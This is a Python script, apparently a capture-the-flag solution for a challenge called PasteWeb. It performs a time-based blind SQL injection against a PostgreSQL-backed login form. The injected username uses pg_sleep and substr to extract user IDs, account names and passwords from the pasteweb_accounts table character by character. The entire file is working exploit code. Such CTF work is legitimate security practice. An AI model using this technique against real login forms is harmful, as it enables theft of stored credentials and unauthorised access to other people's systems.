# PasteWeb1/pasteweb_accounts.py
import requests
from time import time, sleep

printable_char = ''
for i in range(32, 127):
    printable_char += chr(i)

cnt = 0
row = ''
while True:
    cnt += 1
    stop = True
    for c in printable_char:
        sleep(0.1)
        username = "' or 1=(select 1 from pg_sleep(2) where substr((select \
        concat(user_id,' ',user_account,' ',user_password) from \
        pasteweb_accounts limit 1 offset 0),1," \
        + str(cnt) + ")='" + row + c + "') --"
        current_time = str(int(time()))
        url = 'https://pasteweb.ctf.zoolab.org/'
        data = {
            'username': username,
            'password': '',
            'current_time': current_time
        }
        start_time = time()
        requests.post(url, data=data)
        end_time = time()
        if end_time - start_time > 2:
            row += c
            stop = False
            break
    if stop == True:
        break
    print(row)